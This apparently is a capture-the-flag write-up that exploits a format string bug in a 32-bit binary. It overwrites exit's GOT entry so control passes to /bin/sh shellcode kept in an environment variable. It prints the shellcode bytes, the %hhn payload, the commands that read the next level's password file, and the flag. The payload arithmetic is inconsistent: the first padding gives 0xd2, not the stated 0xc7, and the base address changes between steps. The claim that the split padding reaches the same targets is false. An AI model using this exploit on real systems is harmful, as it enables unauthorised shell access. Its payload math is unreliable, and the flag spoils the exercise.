# Level 05 — format string GOT overwrite → shellcode

## Overview
A 32-bit binary with a format string vulnerability. `main` ends with `exit()`
instead of `return`, so we overwrite the **GOT entry of `exit`** with the
address of shellcode placed in an environment variable. When `main` calls
`exit`, it jumps into our shellcode instead.

## Analysis
```sh
objdump -d level05
08048370 <exit@plt>:
 8048370: jmp DWORD PTR ds:0x80497e0     ; exit GOT entry = 0x80497e0
```
> **GOT (Global Offset Table):** a writable table of resolved addresses for
> dynamically linked functions. Overwriting a GOT entry redirects all future
> calls to that function — a classic target for arbitrary-write primitives.

`main` calls `printf` on user input (format string bug) and then `exit`.
Overwriting `exit`'s GOT entry hijacks control.

## Finding the format offset
```sh
echo "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x." | ./level05
```
Our `AAAA` appears at **argument position 10**.

## Placing the shellcode
Store the shellcode in env var `A` (NOP sled + execve `/bin/sh`), which lives
at a predictable address:
```sh
export A=`echo -e -n \
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"\
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`
```
Get its runtime address with a tiny helper (so the value is known, not guessed):
```sh
cat > /tmp/getaddr.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
int main() { printf("%p\n", getenv("A")); return 0; }
EOF
gcc -m32 -o /tmp/getaddr /tmp/getaddr.c
/tmp/getaddr        # e.g. 0xffffd8c2
```
Add ~16 bytes to land safely inside the NOP sled (see
`payload_construction.txt`): `0xffffd8b7 + 16 = 0xffffd8c7`.

## Building the write
We write the 4-byte shellcode address one byte at a time into the four
consecutive GOT bytes using `%hhn`. Target bytes `c7 d8 ff ff`:

| GOT address | byte | decimal |
|-------------|------|---------|
| 0x80497e0   | 0xc7 | 199     |
| 0x80497e1   | 0xd8 | 216     |
| 0x80497e2   | 0xff | 255     |
| 0x80497e3   | 0xff | 255     |

The four addresses occupy 16 bytes of output, so the running `printf` counter
starts at 16. Pad up to each target before each write:
- `199 - 16 = 183` → `%183...` then `%hhn`
- `216 - 199 = 17` → `%17...` then `%hhn`
- `255 - 216 = 39` → `%39...` then `%hhn` (twice, for the two `0xff` bytes)

```sh
python -c 'print \
"\xe0\x97\x04\x08" + \
"\xe1\x97\x04\x08" + \
"\xe2\x97\x04\x08" + \
"\xe3\x97\x04\x08" + \
"%194c" + "%10$hhn" + \
"%6c"   + "%11$hhn" + \
"%39c"  + "%12$hhn" + "%13$hhn"' > /tmp/payload
```
(Here the padding is split differently across `%c` chunks but reaches the same
targets; use `%Nc` when printing characters, `%Ni` when printing integers.)

## Exploitation
```sh
cat /tmp/payload - | ./level05
cat /home/users/level06/.pass
```

## Files
- `steps_level05.txt` — command walkthrough.
- `payload_construction.txt` — byte-by-byte arithmetic for the GOT write.

## Flag
```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
